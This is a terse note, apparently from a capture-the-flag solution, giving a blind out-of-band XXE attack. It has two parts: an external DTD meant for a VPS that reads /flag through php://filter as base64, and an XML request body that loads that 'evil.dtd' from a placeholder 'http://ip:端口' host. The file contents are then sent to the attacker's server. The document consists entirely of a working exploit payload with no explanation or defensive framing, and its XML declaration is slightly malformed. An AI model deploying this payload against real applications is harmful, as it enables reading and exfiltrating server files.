### vps
```dtd
<!ENTITY % get_content SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % send_content "<!ENTITY request SYSTEM 'http://ip:端口/?flag=%get_content'>">
%send_content;
```
### 请求体
```xml
<?xml  version="1" encoding="utf-8">
<!DOCTYPE test [
<!ENTITY % import SYSTEM "http://ip:端口/evil.dtd">
%import;
]>

<test>&request;</test>
```